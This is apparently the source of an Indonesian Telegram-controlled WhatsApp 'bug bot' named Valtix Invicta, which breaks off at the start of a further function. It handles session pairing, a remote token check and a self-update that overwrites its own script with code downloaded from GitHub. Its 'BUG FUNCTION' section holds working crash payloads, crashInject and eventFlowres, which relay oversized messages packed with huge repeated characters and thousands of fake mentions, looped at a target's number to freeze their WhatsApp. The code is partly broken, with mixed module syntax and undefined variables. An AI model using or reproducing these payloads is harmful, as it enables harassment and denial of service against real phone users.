const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
} = require('@whiskeysockets/baileys');
const fs = require("fs");
const P = require("pino");
const crypto = require("crypto");
const path = require("path");
const sessions = new Map();
const readline = require("readline");
const fetch = require("node-fetch");
const cd = "./犬/cooldown.json";
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";
const ONLY_FILE = "./犬/group.json";

function parseMultiNumbers(input) {
  const numbers = input.split(/[\s,;\n\t]+/)
    .map(num => num.replace(/[^0-9]/g, ""))
    .filter(num => num.length >= 10 && num.length <= 15)
    .slice(0, 50);
  return [...new Set(numbers)];
}

// Helper untuk cek socket aktif
function getValidSocket() {
  const sock = sessions.values().next().value;
  if (!sock || !sock.user) throw new Error("❌ Tidak ada bot WhatsApp aktif & stabil.");
  return sock;
}

function isOnlyGroupEnabled() {
  const config = JSON.parse(fs.readFileSync(ONLY_FILE));
  return config.onlyGroup;
}

function setOnlyGroup(status) {
  const config = { onlyGroup: status };
  fs.writeFileSync(ONLY_FILE, JSON.stringify(config, null, 2));
}

function shouldIgnoreMessage(msg) {
  if (!isOnlyGroupEnabled()) return false;
  return msg.chat.type === "private";
}

let premiumUsers = JSON.parse(fs.readFileSync('./犬/premium.json'));
let adminUsers = JSON.parse(fs.readFileSync('./犬/admin.json'));

function ensureFileExists(filePath, defaultData = []) {
    if (!fs.existsSync(filePath)) {
        fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
    }
}

ensureFileExists('./犬/premium.json');
ensureFileExists('./犬/admin.json');


function savePremiumUsers() {
    fs.writeFileSync('./犬/premium.json', JSON.stringify(premiumUsers, null, 2));
}

function saveAdminUsers() {
    fs.writeFileSync('./犬/admin.json', JSON.stringify(adminUsers, null, 2));
}

// Fungsi untuk memantau perubahan file
function watchFile(filePath, updateCallback) {
    fs.watch(filePath, (eventType) => {
        if (eventType === 'change') {
            try {
                const updatedData = JSON.parse(fs.readFileSync(filePath));
                updateCallback(updatedData);
                console.log(`File ${filePath} updated successfully.`);
            } catch (error) {
                console.error(`Error updating ${filePath}:`, error.message);
            }
        }
    });
}

watchFile('./犬/premium.json', (data) => (premiumUsers = data));
watchFile('./犬/admin.json', (data) => (adminUsers = data));

const chalk = require("chalk"); //
const config = require("./config.js");
// =========================================
// AUTO INSTALL MODULE + KUMIS WARNA-WARNI
// =========================================
import { execSync } from "child_process";
import fs from "fs";

function ensure(moduleName) {
  try {
    require.resolve(moduleName);
  } catch {
    execSync(`npm install ${moduleName}`, { stdio: "ignore" });
  }
}

ensure("chalk");
ensure("gradient-string");

import chalk from "chalk";
import gradient from "gradient-string";

function startBot() {
  const art = `
  ⠀⢀⣠⣄⡀⠀⠀⠀⣠⣶⣾⣿⣿⣶⣦⣴⣾⣿⣿⣷⣦⣄⠀⠀⠀⢀⣠⣄⡀⠀
  ⣰⣿⠟⠛⢻⡆⣠⣾⣿⣿⣿⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⣿⣷⡄⢰⠟⠛⢻⣿⡆
  ⢻⣿⣦⣀⣤⣾⣿⣿⣿⣿⣿⣿⠟⠋⠀⠀⠙⠿⣿⣿⣿⣿⣿⣿⣦⣤⣀⣼⣿⡇
  ⠀⠛⠿⢿⣿⣿⡿⠿⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⠿⢿⣿⣿⡿⠿⠋
  `;

  console.log(gradient.rainbow.multiline(art));
}

startBot();
// =========================================
const TelegramBot = require("node-telegram-bot-api");
const axios = require("axios");
const BOT_TOKEN = config.BOT_TOKEN;
const bot = new TelegramBot(BOT_TOKEN, { polling: true });
// ===== UPDATE SYSTEM - NO BACKUP =====
const https = require("https");

// KONFIGURASI UPDATE SYSTEM (WAJIB GANTI URL INI!)
const UPDATE_CONFIG = {
    GITHUB_RAW_URL: "https://raw.githubusercontent.com/AryoDev878/Valtix_Invicta-auto_ubdate/refs/heads/main/ValtixInvicta.js", 
    GITHUB_VERSION_URL: "https://raw.githubusercontent.com/AryoDev878/Valtix_Invicta-auto_ubdate/refs/heads/main/version.json",
    AUTO_CHECK_INTERVAL: 30 * 60 * 1000, // 30 menit sekali cek
};
// ===== END UPDATE SYSTEM CONFIG =====
const GITHUB_TOKEN_LIST_URL =
  "https://raw.githubusercontent.com/AryoDev878/Valtix_Invicta-auto_ubdate/refs/heads/main/tokens.json"; // Ganti dengan URL GitHub yang benar

async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    return response.data.tokens; // Asumsikan format JSON: { "tokens": ["TOKEN1", "TOKEN2", ...] }
  } catch (error) {
    console.error(
      chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message)
    );
    return [];
  }
}

async function validateToken() {
  console.log(chalk.blue("🔍 Memeriksa apakah token terdaftarr..."));

  const validTokens = await fetchValidTokens();
if (!validTokens.includes(BOT_TOKEN)) {
  console.log(chalk.red("❌ Token tidak valid! Pasti penyusup anj wkwkwk."));
  process.exit(1);
}

console.log(chalk.green('# Token aman lanjut aja,gw pantau   '));
}




validateToken();

let sock;

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

      for (const botNumber of activeNumbers) {
        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        sock = makeWASocket ({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        // Tunggu hingga koneksi terbentuk
        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(`Bot ${botNumber} terhubung!`);
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,`\`\`\`
╭━─━─━─━─━─━─━─━─━─
┃┏⊱ Number : ${botNumber}
┃❏ 𝐋𝐨𝐚𝐝𝐢𝐧𝐠 𝐏𝐚𝐢𝐫𝐢𝐧𝐠
╰━─━─━─━─━─━─━─━─━─
\`\`\``,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  sock = makeWASocket ({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

   if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(`\`\`\`
╭━─━─━─━─━─━─━─━─━─
┃┏⊱ Number : ${botNumber}
┃❏ 𝐑𝐞𝐂𝐨𝐧𝐧𝐞𝐜𝐭 𝐀𝐠𝐚𝐢𝐧
╰━─━─━─━─━─━─━─━─━─
\`\`\``,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(`\`\`\`
╭━─━─━─━─━─━─━─━─━─
┃┏⊱ Number : ${botNumber}
┃❏ 𝐅𝐚𝐢𝐥𝐞𝐝 𝐓𝐨 𝐂𝐨𝐧𝐧𝐞𝐜𝐭
╰━─━─━─━─━─━─━─━─━─
\`\`\``,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(`\`\`\`
╭━─━─━─━─━─━─━─━─━─
┃┏⊱ Number : ${botNumber}
┃❏ 𝐒𝐮𝐜𝐜𝐞𝐬𝐬 𝐓𝐨 𝐂𝐨𝐧𝐧𝐞𝐜𝐭
╰━─━─━─━─━─━─━─━─━─
\`\`\``,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );
   } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber, "VALTIX78");
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(`\`\`\`
╭━─━─━─━─━─━─━─━─━─
┃┏⊱ Number : ${botNumber}
┃❏ 𝐒𝐭𝐚𝐭𝐮𝐬 𝐂𝐨𝐧𝐧𝐞𝐜𝐭 𝐏𝐚𝐢𝐫𝐢𝐧𝐠
┃┗⊱ Code : ${formattedCode}
╰━─━─━─━─━─━─━─━─━─
\`\`\``,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `𝗘𝗥𝗥𝗢𝗥\n𝗔𝗹𝗮𝘀𝗮𝗻 : ${error.message}`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }
    }
  });


  sock.ev.on("creds.update", saveCreds);

  return sock;
}


// -------( Fungsional Function Before Parameters )--------- \\
function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;
  
  return `${days} Hari, ${hours} Jam, ${minutes} Menit, ${secs} Detik`;
}

const startTime = Math.floor(Date.now() / 1000); 

function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

//~ Date Now
function getCurrentDate() {
  const now = new Date();
  const options = { weekday: "long", year: "numeric", month: "long", day: "numeric" };
  return now.toLocaleDateString("id-ID", options); 
}

// ===== UPDATE SYSTEM UTILITIES =====
// Helper untuk hash MD5 file
function getFileHash(filePath) {
    if (!fs.existsSync(filePath)) return null;
    return crypto.createHash('md5').update(fs.readFileSync(filePath)).digest('hex');
}

// Download file dari GitHub
async function downloadGitHubFile(url) {
    return new Promise((resolve, reject) => {
        https.get(url, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => resolve(data));
        }).on('error', reject);
    });
}

// Ambil versi dari GitHub
async function getRemoteVersion() {
    const data = await downloadGitHubFile(UPDATE_CONFIG.GITHUB_VERSION_URL);
    return JSON.parse(data);
}
// ===== END UPDATE SYSTEM UTILITIES =====

async function tiktokDl(url) {
  return new Promise(async (resolve, reject) => {
    try {
      let data = [];
      function formatNumber(integer) {
        return Number(parseInt(integer)).toLocaleString().replace(/,/g, ".");
      }

      function formatDate(n, locale = "id-ID") {
        let d = new Date(n);
        return d.toLocaleDateString(locale, {
          weekday: "long",
          day: "numeric",
          month: "long",
          year: "numeric",
          hour: "numeric",
          minute: "numeric",
          second: "numeric",
        });
      }

      let domain = "https://www.tikwm.com/api/";
      let res = await (
        await axios.post(
          domain,
          {},
          {
            headers: {
              Accept: "application/json, text/javascript, */*; q=0.01",
              "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
              "Content-Type":
                "application/x-www-form-urlencoded; charset=UTF-8",
              Origin: "https://www.tikwm.com",
              Referer: "https://www.tikwm.com/",
              "User-Agent":
                "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
            },
            params: {
              url: url,
              count: 12,
              cursor: 0,
              web: 1,
              hd: 2,
            },
          }
        )
      ).data.data;

      if (!res) return reject("⚠️ *Gagal mengambil data!*");

      if (res.duration == 0) {
        res.images.forEach((v) => {
          data.push({ type: "photo", url: v });
        });
      } else {
        data.push(
          {
            type: "watermark",
            url: "https://www.tikwm.com" + res?.wmplay || "/undefined",
          },
          {
            type: "nowatermark",
            url: "https://www.tikwm.com" + res?.play || "/undefined",
          },
          {
            type: "nowatermark_hd",
            url: "https://www.tikwm.com" + res?.hdplay || "/undefined",
          }
        );
      }

      resolve({
        status: true,
        title: res.title,
        taken_at: formatDate(res.create_time).replace("1970", ""),
        region: res.region,
        id: res.id,
        duration: res.duration + " detik",
        cover: "https://www.tikwm.com" + res.cover,
        stats: {
          views: formatNumber(res.play_count),
          likes: formatNumber(res.digg_count),
          comment: formatNumber(res.comment_count),
          share: formatNumber(res.share_count),
          download: formatNumber(res.download_count),
        },
        author: {
          id: res.author.id,
          fullname: res.author.unique_id,
          nickname: res.author.nickname,
          avatar: "https://www.tikwm.com" + res.author.avatar,
        },
        video_links: data,
      });
    } catch (e) {
      reject("⚠️ *Terjadi kesalahan saat mengambil video!*");
    }
  });
}

function getRandomImage() {
  const images = [
    "https://files.catbox.moe/p2jg7w.mp4"
  ];
  return images[Math.floor(Math.random() * images.length)];
}

// ===== UPDATE SYSTEM CORE =====
// Fungsi utama update
async function performUpdate(chatId) {
    const updateMsg = await bot.sendMessage(chatId, "⏳ *Memulai sinkronasi dengan server...*", { parse_mode: "Markdown" });

    try {
        // 1. Ambil data remote
        await bot.editMessageText("📡 *Mengambil data dari GitHub...*", {
            chat_id: chatId,
            message_id: updateMsg.message_id,
            parse_mode: "Markdown"
        });

        const remoteVersion = await getRemoteVersion();
        const remoteScript = await downloadGitHubFile(UPDATE_CONFIG.GITHUB_RAW_URL);

        // 2. Cek hash file untuk deteksi perubahan
        const localHash = getFileHash("./ValtixInvicta.js");
        const remoteHash = crypto.createHash('md5').update(remoteScript).digest('hex');

        // 3. Jika tidak ada perubahan
        if (localHash === remoteHash) {
            const noUpdateMessage = `✨ *SYSTEM ALREADY SYNCHRONIZED*
            
Hai *Premium User*! 👑

📊 *Status File:*
├ Local Hash: ${localHash.substring(0,8)}...
├ Remote Hash: ${remoteHash.substring(0,8)}...
└ Status: ✅ IDENTICAL

Bot kamu sudah dalam kondisi *sinkron sempurna* dengan server GitHub. Tidak ada perubahan yang perlu diterapkan.

💎 *Performa Optimal*
Semua fitur berjalan dengan versi terkini. Kamu bisa fokus menggunakan semua tools premium tanpa khawatir ketinggalan update!

🔔 *Notifikasi Aktif*
Kami akan memberitahu jika ada perubahan mendadak di server.`;
            
            return await bot.editMessageText(noUpdateMessage, {
                chat_id: chatId,
                message_id: updateMsg.message_id,
                parse_mode: "Markdown"
            });
        }

        // 4. Update version.json
        await bot.editMessageText("📝 *Memperbarui versi...*", {
            chat_id: chatId,
            message_id: updateMsg.message_id,
            parse_mode: "Markdown"
        });
        
        fs.writeFileSync("./version.json", JSON.stringify(remoteVersion, null, 2));

        // 5. Replace script (FULL SYNC - no backup)
        await bot.editMessageText("🔄 *Sinkronasi file...*\nMengganti dengan versi terbaru dari server...", {
            chat_id: chatId,
            message_id: updateMsg.message_id,
            parse_mode: "Markdown"
        });

        fs.writeFileSync("./ValtixInvicta.js", remoteScript);

        // 6. Restart otomatis
        await bot.editMessageText("✅ *Sinkronasi Berhasil!*\n\n🔄 Bot akan *restart otomatis* dalam 3 detik...\n\nTerima kasih telah selalu up-to-date! 🚀", {
            chat_id: chatId,
            message_id: updateMsg.message_id,
            parse_mode: "Markdown"
        });

        setTimeout(() => {
            console.log("🔄 Restarting bot...");
            process.exit(0);
        }, 3000);

    } catch (error) {
        await bot.editMessageText(`❌ *Sinkronasi Gagal!*\n\nError: ${error.message}`, {
            chat_id: chatId,
            message_id: updateMsg.message_id,
            parse_mode: "Markdown"
        });
    }
}
// ===== END UPDATE SYSTEM CORE =====

// ~ Coldowwn
let cooldownData = fs.existsSync(cd) ? JSON.parse(fs.readFileSync(cd)) : { time: 5 * 60 * 1000, users: {} };

function saveCooldown() {
    fs.writeFileSync(cd, JSON.stringify(cooldownData, null, 2));
}

function checkCooldown(userId) {
    if (cooldownData.users[userId]) {
        const remainingTime = cooldownData.time - (Date.now() - cooldownData.users[userId]);
        if (remainingTime > 0) {
            return Math.ceil(remainingTime / 1000); 
        }
    }
    cooldownData.users[userId] = Date.now();
    saveCooldown();
    setTimeout(() => {
        delete cooldownData.users[userId];
        saveCooldown();
    }, cooldownData.time);
    return 0;
}

function setCooldown(timeString) {
    const match = timeString.match(/(\d+)([smh])/);
    if (!match) return "Format salah! Gunakan contoh: /settimer 5m";

    let [_, value, unit] = match;
    value = parseInt(value);

    if (unit === "s") cooldownData.time = value * 1000;
    else if (unit === "m") cooldownData.time = value * 60 * 1000;
    else if (unit === "h") cooldownData.time = value * 60 * 60 * 1000;

    saveCooldown();
    return `Cooldown diatur ke ${value}${unit}`;
}

function getPremiumStatus(userId) {
  const user = premiumUsers.find(user => user.id === userId);
  if (user && new Date(user.expiresAt) > new Date()) {
    return `✅`;
  } else {
    return "❌";
  }
}
/////// BUG FUNCTION ///////
async function crashInject(valtix, target) {
  let biji2 = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: " ¿Valtix Invicta¿ ",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: "\x10".repeat(1045000),
              version: 3,
            },
            entryPointConversionSource: "call_permission_request",
          },
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background:
        "#" +
        Math.floor(Math.random() * 16777215)
          .toString(16)
          .padStart(6, "99999999"),
    }
  );
 
  const mediaData = [
    {
      ID: "68917910",
      uri: "t62.43144-24/10000000_2203140470115547_947412155165083119_n.enc?ccb=11-4&oh",
      buffer: "11-4&oh=01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe",
      sid: "5e03e0",
      SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
      ENCSHA256: "dg/xBabYkAGZyrKBHOqnQ/uHf2MTgQ8Ea6ACYaUUmbs=",
      mkey: "C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY=",
    },
    {
      ID: "68884987",
      uri: "t62.43144-24/10000000_1648989633156952_6928904571153366702_n.enc?ccb=11-4&oh",
      buffer: "B01_Q5Aa1wH1Czc4Vs-HWTWs_i_qwatthPXFNmvjvHEYeFx5Qvj34g&oe",
      sid: "5e03e0",
      SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
      ENCSHA256: "25fgJU2dia2Hhmtv1orOO+9KPyUTlBNgIEnN9Aa3rOQ=",
      mkey: "lAMruqUomyoX4O5MXLgZ6P8T523qfx+l0JsMpBGKyJc=",
    },
  ]

  let sequentialIndex = 0
  console.log(chalk.red(`${target} 𝙎𝙚𝙙𝙖𝙣𝙜 𝘿𝙞 𝙀𝙬𝙚 𝙀𝙬𝙚 𝙊𝙡𝙚𝙝 𝙑𝙖𝙡𝙩𝙞𝙭 𝙄𝙣𝙫𝙞𝙘𝙩𝙖⸙`))

  const selectedMedia = mediaData[sequentialIndex]
  sequentialIndex = (sequentialIndex + 1) % mediaData.length
  const { ID, uri, buffer, sid, SHA256, ENCSHA256, mkey } = selectedMedia

  const contextInfo = {
    participant: target,
    mentionedJid: [
      target,
      ...Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
    ],
  }

  const stickerMsg = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: `https://mmg.whatsapp.net/v/${uri}=${buffer}=${ID}&_nc_sid=${sid}&mms3=true`,
          fileSha256: SHA256,
          fileEncSha256: ENCSHA256,
          mediaKey: mkey,
          mimetype: "image/webp",
          directPath: `/v/${uri}=${buffer}=${ID}&_nc_sid=${sid}`,
          fileLength: { low: Math.floor(Math.random() * 1000), high: 0, unsigned: true },
          mediaKeyTimestamp: { low: Math.floor(Math.random() * 1700000000), high: 0, unsigned: false },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo,
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  }

const msgxay = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { text: "ʋαℓƭเא ιɳѵιƈƭα", format: "DEFAULT" },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\x10".repeat(1045000),
            version: 3,
          },
          entryPointConversionSource: "galaxy_message",
        },
      },
    },
  }
  const interMsg = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { text: "ʋαℓƭเא ιɳѵιƈƭα", format: "DEFAULT" },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\x10".repeat(1045000),
            version: 3,
          },
          entryPointConversionSource: "galaxy_message",
        },
      },
    },
  }

  const statusMessages = [stickerMsg, interMsg, msgxay]
 
  
    let content = {
        extendedTextMessage: {
          text: "⸙ᵛᵃˡᵗᶤˣ ᶤⁿᵛᶤᶜᵗᵃ αяє γου?¿" + "ꦾ".repeat(50000),
          matchedText: "ꦽ".repeat(20000),
          description: "⸙ᵛᵃˡᵗᶤˣ ᶤⁿᵛᶤᶜᵗᵃ αяє γου?¿",
          title: "ꦽ".repeat(20000),
          previewType: "NONE",
          jpegThumbnail:
            "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAMAMBIgACEQEDEQH/xAAtAAEBAQEBAQAAAAAAAAAAAAAAAQQCBQYBAQEBAAAAAAAAAAAAAAAAAAEAAv/aAAwDAQACEAMQAAAA+aspo6VwqliSdxJLI1zjb+YxtmOXq+X2a26PKZ3t8/rnWJRyAoJ//8QAIxAAAgMAAQMEAwAAAAAAAAAAAQIAAxEEEBJBICEwMhNCYf/aAAgBAQABPwD4MPiH+j0CE+/tNPUTzDBmTYfSRnWniPandoAi8FmVm71GRuE6IrlhhMt4llaszEYOtN1S1V6318RblNTKT9n0yzkUWVmvMAzDOVel1SAfp17zA5n5DCxPwf/EABgRAAMBAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/AN3jIxY//8QAHBEAAwACAwEAAAAAAAAAAAAAAAERAhIQICEx/9oACAEDAQE/ACPn2n1CVNGNRmLStNsTKN9P/9k=",
          inviteLinkGroupTypeV2: "DEFAULT",
          contextInfo: {
            isForwarded: true,
            forwardingScore: 9999,
            participant: target,
            remoteJid: "status@broadcast",
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1995 },
                () =>
                  `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
              )
            ],
            quotedMessage: {
              newsletterAdminInviteMessage: {
                newsletterJid: "ValtixInvicta@newsletter",
                newsletterName:
                  "⸙ᵛᵃˡᵗᶤˣ ᶤⁿᵛᶤᶜᵗᵃ αяє γου?¿" + "ꦾ".repeat(10000),
                caption:
                  "⸙ᵛᵃˡᵗᶤˣ ᶤⁿᵛᶤᶜᵗᵃ αяє γου?¿" +
                  "ꦾ".repeat(60000) +
                  "ោ៝".repeat(60000),
                inviteExpiration: "999999999"
              }
            },
            forwardedNewsletterMessageInfo: {
              newsletterName:
                "⸙ᵛᵃˡᵗᶤˣ ᶤⁿᵛᶤᶜᵗᵃ αяє γου?¿" + "⃝꙰꙰꙰".repeat(10000),
              newsletterJid: "13135550002@newsletter",
              serverId: 1
            }
          }
        }
      };
      
    const xnxxmsg = generateWAMessageFromContent(target, content, {});

  
  let msg = null;
  for (let b = 0; b < 75; b++) {
  await valtix.relayMessage("status@broadcast", xnxxmsg.message, {
      messageId: xnxxmsg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: []
                }
              ]
            }
          ]
        }
      ]
    });  
  
    await valtix.relayMessage("status@broadcast", biji2.message, {
      messageId: biji2.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: []
                }
              ]
            }
          ]
        }
      ]
    });  
   
     for (const content of statusMessages) {
      const msg = generateWAMessageFromContent(target, content, {})
      await valtix.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }],
              },
            ],
          },
        ],
      })
    }
    if (i < 99) {
    await new Promise(resolve => setTimeout(resolve, 5000));
  }
  } 
}


async function eventFlowres(valtix, jid) {
    await valtix.relayMessage(
        jid, // ← tujuan pengiriman sudah benar
        {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        messageSecret: crypto.randomBytes(32)
                    },
                    eventMessage: {
                        isCanceled: false,
                        name: "‼️⃟  ༚Ꮡ‌‌ ⭑̤ ⟅ 𝚲𝐏͢𝐏𝚯𝐋͢𝚯݉ , ▾ ► 𝚵𝐗͢𝐏𝐋𝚫͢𝐍𝚫𝐓͢𝚰𝚯𝚴͢𝚾 ◄ ⟆ ⭑̤",
                        description: "-you're not alone\nthere is more to this, I know\nyou can make it out\nyou will live to tell",
                        location: {
                            degreesLatitude: "a",
                            degreesLongitude: "a",
                            name: "X"
                        },
                        joinLink: "https://call.whatsapp.com/voice/wrZ273EsqE7NGlJ8UT0rtZ",
                        startTime: "1714957200",
                        thumbnailDirectPath: "https://files.catbox.moe/6hu21j.jpg",
                        thumbnailSha256: Buffer.from('1234567890abcdef', 'hex'),
                        thumbnailEncSha256: Buffer.from('abcdef1234567890', 'hex'),
                        mediaKey: Buffer.from('abcdef1234567890abcdef1234567890', 'hex'),
                        mediaKeyTimestamp: Date.now(),
                        contextInfo: {
                            mentions: Array.from({ length: 2000 }, () =>
                                "1" + Math.floor(Math.random() * 5000000) + "@.s.whatsapp.net"
                            ),
                            remoteJid: "status@broadcast",
                            participant: "0@s.whatsapp.net",
                            fromMe: false,
                            isForwarded: true,
                            forwardingScore: 9999,
                            forwardedNewsletterMessageInfo: {
                                newsletterJid: "120363422445860082@newsletter",
                                serverMessageId: 1,
                                newsletterName: "┃► #fvcker 🩸"
                            },
                            quotedMessage: {
                                interactiveResponseMessage: {
                                    body: {
                                        text: "wtf - MsG",
                                        format: "DEFAULT"
                                    },
                                    nativeFlowResponseMessage: {
                                        name: 'address_message',
                                        paramsJson: "\x10".repeat(1000000),
                                        version: 3
                                    }
                                }
                            }
                        }
                    }
                }
            }
        },
        {
            ephemeralExpiration: 5,
            timeStamp: Date.now()
        }
    );
}


async function Carousel(valtix, target) {
